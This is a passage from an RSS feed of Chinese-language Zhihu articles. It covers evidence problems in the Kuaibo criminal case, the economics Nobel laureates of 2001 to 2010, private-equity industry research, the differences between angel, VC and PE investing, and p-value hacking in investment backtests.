data-pid=\"k1CECeL7\">就本案的证据问题，我们简单分析一下，本案实际上是一件行政转刑事案件，案件的核心证据涉案服务器最初是由北京市海淀区文化委员会作为行政证据收集在案的，之后案件转为刑事案件后，涉案服务器转化为刑事证据。这实际上也是大部分知识产权刑事案件的办案程序，而无论是修改前的刑事诉讼法还是现行的刑事诉讼法，也都规定了<b>行政机关在行政执法和查办案件过程中收集的物证、书证、视听资料、电子数据等证据材料，在刑事诉讼中可以作为证据使用。</b>刑诉法解释则进一步明确了行政机关在行政执法和查办案件过程中收集的物证、书证、视听资料、电子数据等证据材料，经法庭查证属实，且<b>收集程序符合有关法律、行政法规规定的，可以作为定案的根据。</b>需要注意的是，按照最高院的解释行政机关在行政执法和查办案件过程中，尚不知晓所涉案件是否达到犯罪程度、是否会进入刑事诉讼程序，无法也不应适用刑事诉讼程序的规定，只能依照法律、行政法规关于行政执法和查办案件的相关规定。<b>简单来说，就是一句话：行政机关收集证据的程序不受到刑事诉讼法制约。</b>那么问题就出现了，<b>与行政执法程序相比，对刑事侦查的程序控制要严苛周密得多</b>。虽然《行政案件程序规定》《行政处罚法》《行政强制法》以及其他的规范行政执法机关取证的规章中，对行政取证作了一些程序性规定，但是均是寥寥数条，对取证主体的权力约束宽松。而刑事诉讼法及其司法解释对公安机关侦查行为则作了严苛周密的规定。</p>\n<p data-pid=\"7bRUOgiD\">在本案中，表现的就是北京市版权局收集电子数据的程序达不到刑事诉讼要求的程序性规定，比如最起码的电子数据的收集要由侦查人员进行或者最起码的要在侦查人员的主持下进行，保证原始数据的同一性。可以这么说，如果这个案子是公安机关一开始就办理的，将四台服务器直接送给了文创动力公司进行数据提取，脱离了公安机关的控制，不仅仅该鉴定意见可能在审查起诉环节就要被排除掉，恐怕纠违通知也会立刻发给公安机关。然而在此案中却不能说行政机关（版权局）收集的程序不符合行政法规的要求，因为行政机关在此方面就没有具体的规定。尴尬的就在于提取数据是这个程序是不可逆的，公安机关后续的转化行为也难以去补救前述的提取数据程序的合法性。所以回归到本案中，涉案四台服务器的收集以及数据提取问题，确实很难去指责检察机关或者公安机关，甚至我们也看到了公诉人是做了此方面的预案的，只是这个预案没有解决问题，马后炮的说一句，其实最好的办法肯定是在立案之后，第一时间去扣押快播公司别的服务器，让公安机关直接把程序从头拉到尾，不用行政机关扣押的这四台服务器，这四台服务器仅仅作为立案的线索，但现在说这些也没有任何意义了。</p>\n<p data-pid=\"pga6Yl9-\">当然了，如果说数据的收集还能说是因为行政证据与刑事证据衔接的法律空白导致的。那么这个硬盘数字对不上就实在让人无法原谅了，行政机关扣押的服务器的硬盘数量和最后刑事案件中鉴定表述的硬盘数量不一致的问题，是一个极其奇葩的低级错误，以至于这个错误也让公诉人根本无法去正面回答。</p>\n<p data-pid=\"r7RovRiT\">至于说公诉机关在法院审理阶段能不能重新进行鉴定，辩护人认为不能的理由无外乎就是因为刑诉法规定法庭审理过程中，当事人和辩护人、诉讼代理人有权申请新的证人到庭，调取新的物证，申请重新鉴定或者勘验。但<b>实际上检察机关有自行收集证据的权利，只要在开庭之前保证了律师的阅卷权利就可以，而重新鉴定其实就是收集证据的一种方式</b>，所以辩护人的这一点理由笔者并不赞同。</p>\n<p data-pid=\"i27nd32p\">在本案的审理阶段，有一种阴谋论就是认为硬盘是被本案的文创动力给掉包了，原因就是文创动力曾经为快播的竞争对手服务过，可是看了庭审我倒是觉得你说此案有部门利益甚至是有人钓鱼执法我觉得都有可能，但是掉包硬盘的可能性微乎其微，原因就在于这个破案子证据上实在搞得太烂了，烂到一看就不可能是作假做出来的。</p>\n<a data-draft-node=\"block\" data-draft-type=\"mcn-link-card\" data-mcn-id=\"1451651807503769600\"></a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/yiyan-45?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">一言</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/442438168?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"诺贝尔经济学奖得主贡献简介（2001—2010年）","date":"2022-02-16 05:16:29","description":"\n<p data-pid=\"s68MfrLl\">        2001年诺贝尔经济学奖授予George Akerlof、Michael Spence和Joseph Stiglitz 以表彰“他们对存在不对称信息的市场的分析”。</p>\n<p data-pid=\"a9A60ki1\">        这一年获奖的领域是微观经济学，这三名获奖者把对竞争市场的研究扩展到了信息不对称的情形。Akerlof首先指出，买卖双方的信息不对称会导致市场退化，从而产生了“逆向选择”这一术语。Spence提出了信息占优一方发信号的解决方法。Stiglitz提出了信息劣势一方甄别的解决方法（与Rothschild合作），并把不对称信息市场的理论应用到各个场景。</p>\n<p data-pid=\"ARMjVup8\">        2002年诺贝尔经济学奖授予Daniel Kahneman以表彰他“把心理学研究的视角整合入了经济学，特别是关于人类在不确定性下的判断和决策方面”，还授予 Vernon Smith“把实验室实验建立为实证经济学分析的工具，特别是在不同市场机制的研究上。”</p>\n<p data-pid=\"39Glbg8o\">        Kahneman和已故的Tversky合作提出了描述不确定性下决策的新理论，其意义是把心理学视角引入了经济学，开创了行为经济学。</p>\n<p data-pid=\"ZOXNyHS1\">        Smith的贡献是把实验方法引入了经济学。经济学实验的另一个先驱是之前已经因博弈论得奖的Selten。</p>\n<p data-pid=\"KWbMSE74\">        2003年诺贝尔经济学奖授予Robert Engle以表彰“分析波动性随时间变化的经济时间序列的方法（ARCH）”，还授予Clive Granger“分析有共同趋势的经济时间序列的方法（协整）”。</p>\n<p data-pid=\"B4FpFHcj\">        这一年获奖的领域是宏观计量经济学，奖给了分析时间序列数据的两个重要方法。Engle提出了ARCH，Granger提出了协整。</p>\n<p data-pid=\"WLa2z4bh\">        2004年诺贝尔经济学奖授予Finn Kydland and Edward Prescott以表彰“他们对动态宏观经济学的贡献：经济政策的时间不一致性和经济周期的驱动力”。</p>\n<p data-pid=\"dJc0cjMG\">        Kydland和Prescott继承了之前获奖的Lucas的工作，建立了新古典宏观经济学。他们有两个重大贡献，一是提出了宏观经济政策的时间不一致问题，二是建立了真实经济周期理论。</p>\n<p data-pid=\"m_iyZCJf\">        2005年诺贝尔经济学奖授予Robert Aumann和Thomas Schelling以表彰他们“通过博弈论分析加强了我们对冲突与合作的理解”。</p>\n<p data-pid=\"eO6KebDv\">        这一年的获奖领域是微观经济学，两名获奖者都研究了动态情况下的冲突与合作问题。Schelling在《冲突的策略》一书中提出了一些重要的论点，特别是与承诺是否可置信相关的论点。Aumann指出了在短期不能达成合作的博弈在长期可以达成合作，这个观点后来发展成了重复博弈的民间定理。Aumann还有一项很重要的贡献是证明了连续统下一般均衡与核的等价性。</p>\n<p data-pid=\"XepVjUxZ\">        2006年诺贝尔经济学奖授予Edmund Phelps以表彰“他对宏观经济政策的跨期权衡的分析”。</p>\n<p data-pid=\"akYqOmes\">        Phelps对宏观经济学有三个方面的贡献：</p>\n<ol>\n<li data-pid=\"RlpxcWDY\">对Phillips曲线（失业率和通货膨胀率之间的关系）的修正；（与Friedman分别独立做出）</li>\n<li data-pid=\"ud5hwy3L\">经济增长中的最优消费水平；</li>\n<li data-pid=\"I1kADX7T\">人力资本在经济增长中的作用。</li>\n</ol>\n<p data-pid=\"VxVEWjVX\">        2007年诺贝尔经济学奖授予Leonid Hurwicz、Eric Maskin和Roger Myerson以表彰他们“建立了机制设计理论的基础”。</p>\n<p data-pid=\"Nn2Zo5gB\">        这一年获奖的领域是微观经济学，这三名获奖者建立了机制设计理论。Hurwicz首先提出了机制设计的框架。Maskin提出了Nash机制设计中的可执行条件。Myerson则是主要研究了贝叶斯机制设计，特别是证明了显示原理。</p>\n<p data-pid=\"YIBm0QrO\">        2008年诺贝尔经济学奖授予Paul Krugman以表彰他对“贸易模式和经济活动地点的分析”。 </p>\n<p data-pid=\"ESz5USA1\">        Krugman获奖的贡献是建立了新贸易理论和新经济地理学，这两方面都用到了规模经济。</p>\n<p data-pid=\"kYgzHEBi\">        2009年诺贝尔经济学奖授予Elinor Ostrom以表彰“她对经济治理的分析，特别是共同财产”，以及 Oliver Williamson以表彰“他对经济治理的分析，特别是厂商的边界”。</p>\n<p data-pid=\"KmS_3yON\">        Ostrom发现联合起来的使用者可以很好地管理共同拥有的资源。</p>\n<p data-pid=\"5wBpM_EB\">        Williamson继承了Coase的研究，分析了厂商和市场的边界。</p>\n<p data-pid=\"hBG-5pfX\">        2010年诺贝尔经济学奖授予Peter Diamond、Dale Mortensen和Christopher Pissarides以表彰“他们对有搜寻摩擦的市场的分析”。</p>\n<p data-pid=\"rWJvFq_z\">        这一年的三位获奖者建立了搜寻理论。Diamond首先提出搜寻理论。Mortensen和Pissarides把搜寻理论应用于劳动市场以解释失业率和职位空缺率的周期波动。</p>\n<p data-pid=\"Ue1tRo6-\">        总结：这些授奖涉及经济学的三个方面的革新。首先是理论方面的革新，20世纪70年代后经济学在微观和宏观两方面都有理论突破。微观经济学的突破是进入了不完全信息的世界。2001年获奖的是竞争市场上信息不完全的情况。2007年获奖的是存在设计者时信息不完全的情况。宏观经济学的突破是建立了有微观基础的新宏观经济学。这主要归功于Kydland和Prescott。Phelps在60年代的工作则是为宏观经济学的微观基础奠定了基石。2010年获奖的搜寻理论也属于宏观经济学的微观基础的范畴。</p>\n<p data-pid=\"LLWY18BN\">        经济学家在建立理论时总是要对人的偏好做假定，然而人的偏好到底是怎样的呢？以往经济学并不过多研究这个问题，直到Kahneman把心理学视角引入了经济学。从此，行为经济学蓬勃发展起来，经济学家开始真正地关注“人”到底是怎样的。这是经济学的研究范围的重大改变，也使得经济学的基石更加牢靠。</p>\n<p data-pid=\"htTizqKi\">        理论总是需要检验。以往经济学检验理论只是用观察数据，而不去做实验。人们普遍认为，经济学是没法做实验的。Veron Smith打破了这一教条，把实验方法引入了经济学。从此，越来越多的问题开始被放在实验室里进行研究，这对经济学的实证工作而言，是革命性的变化。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/liu-rui-58-95?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">刘锐</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/438206107?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"PE｜美元基金如何做投资研究（行业篇下）","date":"2022-02-16 05:16:09","description":"\n<p data-pid=\"B5pYuM92\">上篇发出后收到了很多小伙伴的私信，交流观点的过程中认知也在不断迭代。后面计划有时间也写写具体到公司层面的分析逻辑，也欢迎大家分享自己的看法和观点</p>\n<h2>5.\t产业链</h2>\n<p data-pid=\"ZbzqtnYg\">1)\t<b>产业链组成及利润分布：</b>通过梳理行业上中下游的构成及市场格局，能够快速了解各环节的利润情况，从而判断出行业中最有投资价值的环节。如咖啡产业链主要分为上游种植、中游深加工和流通、以及下游零售，其中上中游加价率近4x，且商业改造空间不大；而下游加价率超15x，因此咖啡的产业价值主要集中在下游环节</p>\n<p data-pid=\"U-RCuxvA\">2)\t<b>产业链中各方痛点：</b>分析上下游各参与方的痛点及核心诉求，能够判断出标的在产业链中的地位、替代难度及议价能力。若标的能够有效解决各参与方的核心痛点，则其大概率在整个供应链中处于链主的地位，掌握了整个产业链的定价权及利益分配权；反之，若标的所提供的附加值有限，则导致其毛利较薄</p>\n<h2>6.\t竞争格局</h2>\n<p data-pid=\"pCkuSnjX\">1)\t<b>市场集中度：</b>分析目前和未来成熟后的市场集中度能够帮助投资人判断现阶段行业是否具有投资机会。如之前美元基金很喜欢的B2B行业，市场空间巨大，动辄数万亿，且由于产、供、销分离，上下游行业极其分散，因此存在极大整合空间，这类长坡厚雪的赛道通常是美元基金认为的优质赛道（虽然后来各类原因导致B2B的发展并不那么尽如人意）</p>\n<p data-pid=\"oPqYhWaL\">2)\t<b>行业发展阶段：</b>通过分析行业的生命周期，能够判断行业的整体景气度及投资价值。如冻品行业中，速冻米面行业已进入增速较缓的成熟期，行业集中度较高，行业格局已相对稳定，后续增长主要依靠产品结构调整；而预制菜行业正由导入期进入高速成长期，行业集中度较低、渗透率和美日等发达国家存在较大差距，因此现阶段是比较好的关注节点</p>\n<p data-pid=\"20VMc0zi\">3)\t<b>对标成熟市场：</b>通过借鉴成熟市场的经验，分析与成熟市场竞争格局的差异及其原因，能帮助投资人判断行业未来诞生大市值企业的机会，也能对现有创业公司的成长路径有所启示。如对于餐饮供应链来说，美国上游农业集约化、规模化显著，中游流通环节冷链物流体系成熟、下游西餐标准化程度高，因此整体产业背景易催生以Sysco为代表的大市值餐饮流通公司。而中国呢，上游小农经济、中游冷链物流基础设施仍处于发展期、下游中餐八大菜系，标准化程度低，因此产业背景和宏观环境决定了中国的餐饮供应链企业不能完全照搬Sysco的发展模式</p>\n<p data-pid=\"TxmyrCzW\">4)\t<b>行业中玩家特征：</b>行业中玩家的特征决定了行业的竞争规则，若行业玩家同质化严重（如多数工业品流通行业），则大概率会以价格战或依靠某类特殊资源（如商业关系）抢占市场；若行业内玩家差异化显著，则需重点关注各自的差异化优势，并结合下游客户在选择产品/服务时的核心关注因素，选择可投标的</p>\n<p data-pid=\"1d2-BtG2\">5)\t<b>竞争格局：</b>分析目前市场的主要头部玩家，对比各家的竞争优势、劣势及致胜壁垒。分析行业内获得竞争优势的核心因素（如股东资源/地理位置等），同时判断行业中玩家的竞争过程中是否会出现对格局的颠覆性改变。如跨境出口电商，早期依托海外市场线上化红利的释放，快速起量，建立规模效应；长期通过运营效率和供应链组织能力发展品牌化，未来市场格局的发展趋势大概率就是由早期的三方大卖向精品和独立站卖家演变</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/sylvia-yau?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">偎生</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br>\n","link":"http://zhuanlan.zhihu.com/p/446386269?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"天使投资、VC 以及 PE 的区别是什么？","date":"2022-02-16 05:15:14","description":"\n<p data-pid=\"GRmM57IJ\">在欧洲干了几年PE，目前又在募一个新的基金。我试着回答一下。</p>\n<p data-pid=\"-6xpoTTY\">天使投资，VC和PE并列来比较区别是不准确的。PE，Private Equity是一个大的门类，特指投资的标的是Private（私人的）Equity（股权）。PE属于广义的Alternative Investment（另类投资），通常处于另类投资门类的监管之下，通常意味着投资标的具有低流动性或者高风险。</p>\n<p data-pid=\"2abR_Rjn\">私人股权是有别于Pulic（公开）Equity（股权）的，后者意味着可以在政权市场进行直接和迅速的交易，前者则通常不可以。中文对Private Equity翻译为“私募”股权，似乎在引导读者认为这类投资的定义来源于它的募资方式而非它的投资标的，我认为是有歧义的。</p>\n<p data-pid=\"bYKAPsBz\">依照私人股权作为投资标的的定义，所谓的天使投资，风险投资（VC），都属于私人股权投资的的范畴，以下都称为PE。</p>\n<p data-pid=\"GUPAZQKK\">在PE这个大的范畴内，依据投资策略，又可细分为以下四类：</p>\n<p><img src=\"https://pic1.zhimg.com/v2-75b6e49ce63cb9b2bb113351a972407d_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1498\" data-rawheight=\"1231\" data-watermark=\"watermark\" data-original-src=\"v2-75b6e49ce63cb9b2bb113351a972407d\" data-watermark-src=\"v2-0ecd82c38c24433ab8f9a66ec0c5a49a\" data-private-watermark-src=\"v2-9516cb777e475db01d7907a72f0aa427\"></p>\n<p data-pid=\"5oCb6crQ\"><b>Leverage Buyout，即杠杆收购投资策略。</b>在该交易中，通常使用财务杠杆从当前股东手中收购公司、业务单位或业务资产。参与这些交易的公司通常成熟并产生经营现金流。这类交易策略属于PE领域规模最大也是最知名的一部分，知名的投资机构包括美国KKR，黑石，凯雷（现在的联储主席鲍威尔就是凯雷的前合伙人），Apollo Global Management，Ares等等；欧洲的CVC（收购俏江南），瑞典的EQT等等。<br><b>非常重要的一点是：LBO策略通常要收购标的企业或资产的全部或至少控股股权。</b></p>\n<p data-pid=\"-VfduPr1\"><b>Growth Capital，成长型投资策略。</b>最常见的是少数股权投资，投资于相对成熟的公司，这些公司正在寻找资本来扩大或重组业务、进入新市场或为重大收购提供资金，而不会改变业务控制权。许多大型的PE公司也会参与成长型投资。而根据我长期与国内同行的交流，<b>国内大部分的PE都属于这个策略，寻求在企业高速增长乃至成熟阶段突击入股，以期待在公司进行IPO时获得收益并从二级市场退出</b>。</p>\n<p data-pid=\"c3-XstuZ\"><b>Venture capital，风险投资。</b>指的是通常在不太成熟的公司中进行的股权投资，用于启动种子或初创公司、早期发展或业务扩张。风险投资最常出现在新技术、新营销理念和新产品的应用中，这些新产品没有良好的业绩记录或稳定的收入来源，商业模式刚刚形成但还需要得到市场的检验、监管机构（典型的如药物研发型企业）的认可，或者在竞争中脱颖而出。</p>\n<p data-pid=\"ezQJ-joq\"><b>风险投资通常可以按公司的发展阶段细分，从用于启动初创公司的天使投资到中后期的成长型策略，某种程度来说都可以算作风险投资，</b>通常用于资助现有业务的扩张，这些业务产生收入但可能尚未盈利或产生现金流为未来增长提供资金。</p>\n<p data-pid=\"O1Bm_JBk\"><b>Angel investment，天使投资。</b>属于广义的风险投资的一部分。通常阶段更早，可能初创公司产品尚未完成，商业模式尚处于建设阶段，而此时的投资能够提供资金协助企业完成最初的产品和商业模式的开发。<br>天使投资的风险太大，因此业内常言天使投资人都是3F：Friends（朋友），Family（家人），Fools（傻瓜）。（有朋友询问如何找天使投资人募资，答案很明显了，把他们变成你的朋友，家人或者当成傻瓜。）</p>\n<p data-pid=\"Cux_W5xj\"><b>Mezzanine capital，夹层资本。</b>投资标的是次级债务或优先股，是一种对公司资产的债权，优先级高于普通股。对于公司而言，夹层资本通常是比担保债务或优先债务更昂贵的融资来源。<br>据我接触的夹层投资而言，这种策略常常是PE进入一家长期前景看好但短期现金流吃紧的企业的工具。这类企业的所有人通常对企业价值有很高的认识，不愿意出售股权哪怕是小股权。这时PE选择夹层融资策略可以保持未来购买股权的选项。<br>夹层融资也被用于杠杆收购之中用于提高收购方的杠杆率。</p>\n<p><img src=\"https://pic4.zhimg.com/v2-a4960def820eba3be185b053ad837fa3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1897\" data-rawheight=\"1138\" data-watermark=\"watermark\" data-original-src=\"v2-a4960def820eba3be185b053ad837fa3\" data-watermark-src=\"v2-fd686b8346e3dff3c16bfcc549ef9bb2\" data-private-watermark-src=\"v2-a40338e01acbc5cff3e892c9b6c4a91f\"></p>\n<p data-pid=\"7Ir4SRsw\"><b>关于投资策略的简单讨论</b></p>\n<p data-pid=\"F6FN_5Zi\">在欧美市场上，LBO（杠杆收购是绝对的主流），基本占PE市场总量的约80%。原因在于LBO是一个相对风险可控而收益极佳的投资策略。</p>\n<p data-pid=\"0eM4DxT4\">杠杆收购的基本逻辑是，以Libor+3（2-4之间）的5-7年期贷款利率，Equity：Debt Ratio（股权债务比率）欧洲大约4:6（欧洲银行保守，有严格限制），美国大约2:8（特别狠的，我见过某美国顶级PE的一个案子，做到1:9）对公司进行收购。完成后通过所有可能的手段<b>提高现金流，降低税前利润，用最快的速度将公司产生的所有现金来偿还并购贷款。</b></p>\n<p data-pid=\"uSWI8Zjd\">PE的盈利的主要以及唯一重要来源是去杠杆。这就好比你买了一套房100万，首付20万贷款80万，5年期贷款5%的利率，每年要还款接近20万（逐年递减）。而PE的神奇之处正在于，他能够在5年内不额外投资一分钱（甚至还要通过股东贷款或者分红等方式挤出利润）的方式把债还干净。当你5年后出售房子的时候，即使市场行情不好你只卖了80万，看起来亏损了20万，实际上则是获利了60万，300%的利润。如果碰上冤大头的买家，或者市场景气，企业能以220万的价格出手（部分来源于企业销售额随市场自然扩张而增长，或者IPO市场估值偏高），获利能到1000%。</p>\n<p data-pid=\"XO0IKuFd\">这就使得LBO是一个相对于其他策略更受欢迎的PE策略，因为整个过程不需要太多关注企业的产品和市场前景乃至管理层的能力与水平，而只需要专注于财务控制和所谓的“金融工程”（Financial Engineering）。毕竟，隔行如隔山，你又怎么能指望金融机构的投资者对产业和产品的判断优于长期浸淫其中的创业者和公司管理团队呢？</p>\n<p data-pid=\"PPy1fjuh\">与LBO的风险和回报更为可控相比，由于产品、商业模式、管理层/创始人团队乃至监管的态度存在诸多的未知数，风险投资更像是一种押注，而作为较小的股东且对新生的商业模式和产品往往更缺乏了解，风险投资者在企业中原则上来说是处于相对较为弱势的地位，即使企业运营良好，投资者也将面临来自创始人，管理层乃至其他投资机构对于企业发展方向的不一致观点，局面可能会失去控制（Out of hand）。</p>\n<p data-pid=\"dpU4fcsk\">因此风险投资常常采取的一种策略是，并不押注于某一家公司，而是对某一个创新领域/行业进行广泛押注，即所谓“赛道”。这一策略的好处在于可以避免某一个被投企业的不确定性，在一群赛马中总能压中脱颖而出的那一个；另一方面又可以经由对同一赛道的多家公司的投资把握整个行业的趋势和风向，即使调整策略；最后甚至可以通过对竞争对手之间的分别押注，推动市场整合，某种程度上“揠苗助长”的帮助其中的一匹最优的赛马拔得头筹。</p>\n<p data-pid=\"kHrFyeEW\"><b>从投资收益率来看，近年来PE（LBO策略）和VC的表现不相伯仲，但也仅仅将将跑平标普500大盘。</b>而PE/VC对于LP机构的成本可要大得多。根据金融时报的报道，牛津大学教授Ludovic表示，过去10年PE/VC机构收取的管理费大约为2300亿美元。他说：“从几亿养老金计划成员到几千人从事的私人股权投资（PE行业），可能是现代金融史上最大的一笔财富转移”。</p>\n<p><img src=\"https://pic1.zhimg.com/v2-fdc90156f798077ef7d04ef9e82da7e4_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1536\" data-rawheight=\"864\" data-watermark=\"watermark\" data-original-src=\"v2-fdc90156f798077ef7d04ef9e82da7e4\" data-watermark-src=\"v2-8bcc0ea96106a0a1accea9f1f9bed167\" data-private-watermark-src=\"v2-b68cd31a3c164e0734c6f454ac512cdc\"></p>\n<p data-pid=\"9Xh2LXq5\">以上仅是作者在欧洲投资市场的经验、观察和理解。经过与国内同行的许多交流，我发现国内市场的PE/VC的运作与欧洲有较大的差别。本人观点和经验在国内市场可能并不适用。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/will-shen-78?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">will shen</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/19590714/answer/2292433722?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">82 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/22098064?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">怎么样才能去PE或者VC工作？</a><br><a href=\"http://www.zhihu.com/question/475960058?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">那些从顶级VC、PE出来的人都去了哪里？</a><br>\n","link":"http://www.zhihu.com/question/19590714/answer/2292433722?utm_campaign=rss&utm_medium=rss&utm_source=rss&utm_content=title"},{"title":"4.为什么你回测没用(1)","date":"2022-02-16 05:15:04","description":"\n<p data-pid=\"ArrlQBBs\">投资的一大误区是认为只要通过<b>机械化复盘或者回测然后找到最优的参数和规则就能找到最优的投资方法</b>。事实上这也是很多\"量化投资培训\"所教的东西，通过回测来寻找最优的投资思路。很可惜，在网上传授这样的回测研究方法错的离谱，原因可以理解为<b>p-value hacking</b>。</p>\n<p data-pid=\"WLxSAPiD\">那么，什么是p-value hacking呢？我们先通过一个例子来讲讲什么是p-value：假设我们有一个人口数据分布，比如我们相信正常人分布都是在170cm左右，然后比170矮的人或者高的人的比例会随着离170cm越远从而越来越少。这个分布的形状，也许，我们可以通过一个钟型曲线的正态分布来描述，即用一个参数模型（parametric model）来表述人口的分布。这时，如果有个小A给我们一个关于人口的抽样数据中出现一个身高390cm的数据，那么这个数据，在我们假设的参数分布中出现的概率是多少呢？这其实就是390cm这个数据在已知模型下观测到的概率。</p>\n<blockquote data-pid=\"Wkqtzzla\">p-value is <b>a measure of the probability that an observed difference could have occurred just by random chance</b>.</blockquote>\n<p data-pid=\"p2sT8Vgr\">好的，我们现在了解到了p-value就是在假设分布（或者说叫原假设）下的数据观测概率，那什么是p-value hacking? </p>\n<p data-pid=\"-ZGUVH0D\">要说明清楚p-value hacking。就还要搞清楚<b>回测到底是在做什么</b>。回测看起来只是在顺着一个个时间点模拟一个交易决策的流程，然后根据某些标准或统计量（比如平均盈利能力）来优化参数或者规则。我们可以通过 <img src=\"https://www.zhihu.com/equation?tex=f_1%28data%29+%3D+%5Cmu\" alt=\"f_1(data) = \\mu\" eeimg=\"1\"> 表示我们以上做的事情：把数据(data)丢给交易规则（ <img src=\"https://www.zhihu.com/equation?tex=f_1\" alt=\"f_1\" eeimg=\"1\"> ）映射到某个统计量( <img src=\"https://www.zhihu.com/equation?tex=%5Cmu\" alt=\"\\mu\" eeimg=\"1\"> )。为了简单起见，我们可以姑且认为此处统计量( <img src=\"https://www.zhihu.com/equation?tex=%5Cmu\" alt=\"\\mu\" eeimg=\"1\"> )就是平均盈利能力。</p>\n<p data-pid=\"cP9MSe65\">那么我们在跑完回测后做的事是什么？我们想检查统计量( <img src=\"https://www.zhihu.com/equation?tex=%5Cmu\" alt=\"\\mu\" eeimg=\"1\"> )即平均盈利能力和0相比是否远大于0，即是否有统计显著。而这个过程等价于我们对数据做了一次测试（test）：我们假设<img src=\"https://www.zhihu.com/equation?tex=f%28data%29+%3D+0\" alt=\"f(data) = 0\" eeimg=\"1\"> ，然后通过跑出来结果看是否拒绝这个假设。即通过观察p-value是否足够小，来决定是否拒绝假设假设<img src=\"https://www.zhihu.com/equation?tex=f%28data%29+%3D+0\" alt=\"f(data) = 0\" eeimg=\"1\">。</p>\n<p data-pid=\"4ekPUzYt\">如果结果不好怎么办？按照有些课程里的方法，会让你修改交易规则成你喜爱的规则 <img src=\"https://www.zhihu.com/equation?tex=f_2\" alt=\"f_2\" eeimg=\"1\"> ，然后再跑一次。完成这个过程，我们又做了一次测试……直到天荒地老测试了n次。</p>\n<p data-pid=\"v-QeDM-t\">这时候你已经掉进了<b>多重假设检验（multiple comparison problem, MCP）</b>的陷阱：你完成的n次测试其实是同时在相同数据集上测试n个交易规则。这会导致什么问题呢？</p>\n<p data-pid=\"j9MEDFMY\">1.<b><i>我们产生了大量的假的发现(finding)</i></b>。我们不妨假设调整的交易规则之间是独立的，且会偶然地产生假的平均盈利能力远大于0的统计量。即每次测试交易规则，我们都有错误地拒绝它的概率：即策略本身没有盈利能力，但是测试出来显示它有。如果这个概率是0.2，不犯错的概率0.8，那么跑回测20次，在独立的假设下，发现至少一个假策略的概率是98.85%。我们通过持续不断地根据数据调整我们的规则和参数，最终形成了大量的p-value非常小但是没有盈利能力的规则：这就叫p-value hacking。</p>\n<p data-pid=\"DaFCr4dv\">对这个假阳性问题部分易懂描述可参考 ：</p>\n<a href=\"https://zhuanlan.zhihu.com/p/363647933\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/equation.jpg\" data-image-width=\"120\" data-image-height=\"120\" class=\"internal\">蒟蒻王：0.常识：投资是一个需要连续检验的过程</a><p data-pid=\"XaLvf4g3\">2.<b><i>那么我们究竟测的是什么呢？</i></b>网上有些教程告诉你，测试n次找到最好的几个参数（即p-value最小的规则或者参数）然后上实盘。hopefully it may work。但是这个过程让我们找到的参数实际是最大统计量(max statistics)。那么，我们凭什么相信在训练集或者validation set上得到的 <img src=\"https://www.zhihu.com/equation?tex=%5Chat%7Bmax+%5C+%5Cmu%7D\" alt=\"\\hat{max \\ \\mu}\" eeimg=\"1\"> 是测试集或者未来的行情上的平均收益的无偏估计呢？<img src=\"https://www.zhihu.com/equation?tex=E_%7Btest%7D%5B%5Chat%7Bmax+%5C+%5Cmu%7D%5D\" alt=\"E_{test}[\\hat{max \\ \\mu}]\" eeimg=\"1\"> 凭什么能是平均收益的无偏估计？显然这是个过于乐观估计的统计量。</p>\n<p data-pid=\"D0MEG4Pm\">3.更糟糕的是，我们以上的说法中测试和测试之间是独立的，<b><i>然而实际上很可能是存在依赖关系或者相关的。</i></b>那我们有没有办法矫正呢？比较困难。比如BH or storey's procedure能处理比较弱的依赖关系（weak dependence），但是面对比较强依赖关系这些方法就直接失效了。还比如，<b>outliers和相关性</b>出现在predictor或/且label中这可能会导致我们的测试的power会迅速下降，即哪怕我们有些交易规则真的有能力，我们也很难发现它们存在。</p>\n<p data-pid=\"up6Oz79i\">takeaway notes：一般人真的不要花时间花钱写量化码。除非你是打算做这行那么先看论文，比如处理multiple comparison under dependence 